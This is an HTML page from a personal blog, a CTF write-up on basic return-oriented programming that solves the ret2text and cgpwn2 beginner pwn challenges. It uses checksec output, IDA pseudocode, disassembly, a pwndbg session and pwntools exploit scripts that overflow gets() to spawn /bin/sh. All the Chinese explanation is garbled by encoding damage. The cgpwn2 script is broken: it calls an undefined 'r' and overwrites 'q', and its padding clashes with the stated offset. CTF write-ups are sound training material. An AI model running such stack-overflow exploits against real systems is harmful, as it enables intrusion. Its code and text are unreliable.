<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>æ„é€ åŸºæœ¬rop | nianchu</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://cc-nianchu.github.io/favicon.ico?v=1664362264800">
<link rel="stylesheet" href="https://cc-nianchu.github.io/styles/main.css">


  

  
    <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css" />
  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content=" èƒ½æ„é€ ropçš„é¢˜ç›®å¾—æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š
        ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚
        å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚

å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³..." />
    <meta name="keywords" content="" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://cc-nianchu.github.io">
        <img src="https://cc-nianchu.github.io/images/avatar.png?v=1664362264800" class="site-logo">
        <h1 class="site-title">nianchu</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      nianchuçš„blog
    </div>
    <div class="site-footer">
      Powered by <a >nianchu</a> | <a class="rss" href="https://cc-nianchu.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">æ„é€ åŸºæœ¬rop</h2>
            <div class="post-date">2021-07-14</div>
            
            <div class="post-content" v-pre>
              <pre><code> èƒ½æ„é€ ropçš„é¢˜ç›®å¾—æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š
        ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚
        å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚
</code></pre>
<p>å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ğŸ˜³</p>
<h2 id="ret2text">ret2text</h2>
<p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROP;<br>
åšé¢˜ç›®å‰é¦–å…ˆå¾—æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</p>
<!-- more -->
<p>Arch:     i386-32-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x8048000)</p>
<!-- more -->
<p>å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºè¿™æ˜¯32ä½ç¨‹åºï¼Œåªå¼€äº†NXä¿æŠ¤<br>
æˆ‘ä»¬ç”¨ida32æ‰“å¼€æ–‡ä»¶   æŒ‰F5è¿›å…¥mainå‡½æ•°</p>
<!-- more -->
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
{<br>
char s[100]; // [esp+1Ch] [ebp-64h] BYREF</p>
<p>setvbuf(stdout, 0, 2, 0);<br>
setvbuf(_bss_start, 0, 1, 0);<br>
puts(&quot;There is something amazing here, do you know anything?&quot;);<br>
gets(s);<br>
printf(&quot;Maybe I will tell you next time !&quot;);<br>
return 0;<br>
}</p>
<!-- more -->
<p>å‘ç°getsï¼ˆï¼‰å‡½æ•°ï¼Œgetsæ˜¯ä¸é™åˆ¶è¾“å…¥å†…å®¹ï¼Œä»…æ”¶åˆ°å›è½¦åç»“æŸ //getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥'\x00'<br>
å†æŸ¥çœ‹å…¶ä»–å‡½æ•°å‘ç°/bin/sh          //ç»å…¸åé¢å‡½æ•°ç›´æ¥è¿›å…¥ç³»ç»Ÿ</p>
<!-- more -->
<p>void secure()<br>
{<br>
unsigned int v0; // eax<br>
int input; // [esp+18h] [ebp-10h] BYREF<br>
int secretcode; // [esp+1Ch] [ebp-Ch]</p>
<p>v0 = time(0);<br>
srand(v0);<br>
secretcode = rand();<br>
__isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);<br>
if ( input == secretcode )<br>
system(&quot;/bin/sh&quot;);<br>
}</p>
<!-- more -->
<p>å†idaæ‰¾åˆ°/bin/shçš„åœ°å€</p>
<!-- more -->
<p>.text:080485FD                 push    ebp<br>
.text:080485FE                 mov     ebp, esp<br>
.text:08048600                 sub     esp, 28h<br>
.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>
.text:0804860A                 call    _time<br>
.text:0804860F                 mov     [esp], eax      ; seed<br>
.text:08048612                 call    _srand<br>
.text:08048617                 call    _rand<br>
.text:0804861C                 mov     [ebp+secretcode], eax<br>
.text:0804861F                 lea     eax, [ebp+input]<br>
.text:08048622                 mov     [esp+4], eax<br>
.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>
.text:0804862D                 call    ___isoc99_scanf<br>
.text:08048632                 mov     eax, [ebp+input]<br>
.text:08048635                 cmp     eax, [ebp+secretcode]<br>
.text:08048638                 jnz     short locret_8048646<br>
.text:0804863A                mov  dword ptr [esp], offset command ; &quot;/ bin/sh<br>
.text:08048641                 call    _system</p>
<!-- more -->
<p>å‘ç°/bin/shåœ°å€åœ¨0x0804863A,è¿™æ˜¯bin_str=0x0804863Aï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç›´æ¥æ§åˆ¶ç¨‹åºè¿”å›è‡³ 0x0804863A<br>
ä¸‹é¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•æ„é€  payload äº†ï¼Œä»getså¼€å§‹å¯»æ‰¾</p>
<!-- more -->
<p>.text:080486A7                 lea     eax, [esp+1Ch]<br>
.text:080486AB                 mov     [esp], eax      ; s<br>
.text:080486AE                 call    _gets</p>
<!-- more -->
<p>åˆ©ç”¨gdbæ¥æ‰“æ–­ç‚¹</p>
<!-- more -->
<p>pwndbg&gt; b *0x080486AE<br>
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>
pwndbg&gt; r<br>
Starting program: /home/nianchu/Desktop/æ–°æ‰‹è®­ç»ƒ/ret2text<br>
There is something amazing here, do you know anything?</p>
<p>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>
24	ret2text.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.<br>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>
EAX  0xffffcefc â€”â–¸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x26f34<br>
EBX  0x0<br>
ECX  0xf7fb7dc7 (<em>IO_2_1_stdout</em>+71) â—‚â€” 0xfb88900a<br>
EDX  0xf7fb8890 (_IO_stdfile_1_lock) â—‚â€” 0x0<br>
EDI  0x0<br>
ESI  0xf7fb7000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x1d7d8c<br>
EBP  0xffffcf68 â—‚â€” 0x0<br>
ESP  0xffffcee0 â€”â–¸ 0xffffcefc â€”â–¸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) â—‚â€” 0x26f34<br>
EIP  0x80486ae (main+102) â€”â–¸ 0xfffdade8 â—‚â€” 0xfffdade8</p>
<!-- more -->
<p>ä»ESPå¯ä»¥å‘ç°åœ¨espä¸º0xffffcee0ï¼Œebpä¸º0xffffcf68,sä¸º0xffffcefc<br>
Â·Â·Â·Â·Â·Â·Â·Â·Â·s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6c<br>
Â·Â·Â·Â·Â·Â·Â·Â·Â·s ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»ä¸º 0x6c+4<br>
æœ€åpayloadæ„é€ å¦‚ä¸‹ï¼š</p>
<!-- more -->
<p>from pwn import*</p>
<p>q=process('./ret2text')<br>
bin_str=0x0804863A<br>
payload='a'*(0x6c+4)+p32(bin_str)<br>
q.sendline(payload)<br>
q.interactive()</p>
<!-- more -->
<h2 id="cgpwn2">cgpwn2</h2>
<p>è¿™é“é¢˜åœ¨æ”»é˜²ä¸–ç•Œçš„æ–°æ‰‹é¢˜ï¼Œæ‹¿åˆ°é¢˜ç›®å…ˆchecksecä¸€ä¸‹</p>
<pre><code>Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>ç„¶åæ‰“å¼€ida32ä½f5è·å¾—ä¼ªä»£ç </p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  hello();
  puts(&quot;thank you&quot;);
  return 0;
}
</code></pre>
<p>å¯ä»¥å‘ç°mainå‡½æ•°é‡Œé¢å•¥éƒ½æ²¡æœ‰ï¼Œåªæœ‰3ä¸ªç¼“å†²åŒºå’Œæœ‰ä¸ªhello()å‡½æ•°ï¼Œç»§ç»­æ‰“å¼€çœ‹çœ‹</p>
<pre><code>char *hello()
{
  __int16 *v0; // eax
  int v1; // ebx
  unsigned int v2; // ecx
  __int16 *v3; // eax
  __int16 s; // [esp+12h] [ebp-26h] BYREF
  int v6; // [esp+14h] [ebp-24h] BYREF

  v0 = &amp;s;
  v1 = 30;
  if ( ((unsigned __int8)&amp;s &amp; 2) != 0 )
  {
    s = 0;
    v0 = (__int16 *)&amp;v6;
    v1 = 28;
  }
  v2 = 0;
  do
  {
    *(_DWORD *)&amp;v0[v2 / 2] = 0;
    v2 += 4;
  }
  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );
  v3 = &amp;v0[v2 / 2];
  if ( (v1 &amp; 2) != 0 )
    *v3++ = 0;
  if ( (v1 &amp; 1) != 0 )
    *(_BYTE *)v3 = 0;
  puts(&quot;please tell me your name&quot;);
  fgets(name, 50, stdin);
  puts(&quot;hello,you can leave some message here:&quot;);
  return gets((char *)&amp;s);
}
</code></pre>
<p>å‰é¢çœ‹ä¸æ‡‚æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä¸»è¦çœ‹åˆ°åé¢æœ‰</p>
<pre><code>puts(&quot;please tell me your name&quot;);
  fgets(name, 50, stdin);
  puts(&quot;hello,you can leave some message here:&quot;);
  return gets((char *)&amp;s);
</code></pre>
<p>ä»gets()å‡½æ•°å¯ä»¥nameé‚£é‡Œå¯ä»¥çœ‹å‡ºè¿™é‡Œå¯ä»¥æ ˆæº¢å‡ºç„¶åå†™å…¥æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿<br>
åœ¨å‡½æ•°åˆ—è¡¨çœ‹åˆ°ä¸€ä¸ªpwnå‡½æ•°ï¼Œæ‰“å¼€å¾—</p>
<pre><code>int pwn()
{
  return system(&quot;echo hehehe&quot;);
}
</code></pre>
<p>mainå‡½æ•°å’Œhelloå‡½æ•°é‡Œé¢éƒ½æ²¡æœ‰ä»–ï¼Œè€Œä¸”è¿™ä¸ªå‡½æ•°æ˜¯æ‰“å°heheheä½†æ˜¯å¯ä»¥è·å¾—systemå‡½æ•°ï¼Œ<br>
å› æ­¤æˆ‘ä»¬å…ˆé€šè¿‡æ ˆæº¢å‡ºå°†å¼•ç”¨pwnå‡½æ•°å†å°†é‡Œé¢çš„echo heheheæ”¹æˆ/bin/sh<br>
æ€è·¯æ¸…æ™°äº†ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡idaæ‰¾åˆ°call systemå‡½æ•°çš„åœ°å€ï¼Œå†æ‰¾nameçš„åœ°å€<br>
å†æ‰¾sçš„åç§»é‡<br>
å…ˆé€šè¿‡shift+f4æ‰¾åˆ°pwnå‡½æ•°åœ°å€ï¼ŒåŒå‡»pwnå‡½æ•°<br>
<img src="https://cc-nianchu.github.io/post-images/1626536255632.png" alt="" loading="lazy"><br>
<img src="https://cc-nianchu.github.io/post-images/1626536266388.png" alt="" loading="lazy"><br>
åœ¨è¿™é‡Œå¯ä»¥å‘ç°sys_addr=0x0804855A<br>
åœ¨helloå‡½æ•°é‡Œå¯ä»¥å‘ç° name_addr=0x0804A080,sçš„åç§»é‡ä¸º24<br>
æˆ‘ä»¬è¦è¿è¡Œsystem(/bin/sh)å› æ­¤æˆ‘ä»¬è¦è¾“å…¥/bin/shåˆ°sys_addrä¸Š<br>
exp:</p>
<pre><code>from pwn import *
q = remote('ip',ç«¯å£)
sys_addr = 0x804855A
name_addr = 0x804A080
payload = 'a' * 0x26 + 'bbbb' + p32(sys_addr) + p32(name_addr)
q = r.recvuntil('please tell me your name')
q.sendline('/bin/sh')
q = r.recvuntil('hello,you can leave some message here:')
q.sendline(payload)
q.interactive()
</code></pre>

            </div>
            
            

            
              

              
                <div id="disqus_thread" data-aos="fade-in"></div>
              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>




  

  
    <script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
    <script>

    var options = {
      shortname: '',
      apikey: '',
    }
    if ('') {
      options.api = ''
    }
    var dsqjs = new DisqusJS(options)

    </script>
  




  </body>
</html>
